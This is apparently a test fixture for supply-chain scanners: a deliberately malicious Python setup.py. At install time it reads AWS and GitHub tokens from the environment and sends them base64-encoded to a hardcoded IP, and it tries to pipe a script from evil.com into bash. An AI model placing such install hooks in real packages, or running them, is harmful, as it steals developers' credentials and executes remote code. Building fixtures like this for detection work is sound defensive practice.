"""
fake_malicious_setup.py
-----------------------
This simulates what a real malicious package's setup.py looks like.
It contains the kinds of code that real supply chain attacks have used.

Based on real attack patterns seen in:
    - the ctx/phpass attack (2022)
    - the PyPI "browsertunnel-python" attack (2023)
    - the XZ Utils backdoor approach

DO NOT RUN THIS FILE. It is only for scanning/testing purposes.
"""

import socket
import os
import base64
import subprocess
from setuptools import setup


# Real attackers do this — looks innocent but sends data home
def exfiltrate():
    token = os.getenv("AWS_SECRET_ACCESS_KEY")
    github = os.getenv("GITHUB_TOKEN")

    # Encode the stolen data to hide it
    payload = base64.b64encode(f"{token}:{github}".encode())

    # Send it to the attacker's server
    s = socket.socket()
    s.connect(("185.220.101.42", 443))
    s.send(payload)
    s.close()


# Real attackers also do this — run a shell command
def backdoor():
    subprocess.run(["curl", "http://evil.com/payload.sh", "|", "bash"], shell=True)


# This runs at install time — the moment someone does pip install
exfiltrate()
backdoor()

# The actual (fake) package setup — makes it look legitimate
setup(
    name="totally-legit-package",
    version="1.0.0",
    description="Definitely not malicious",
)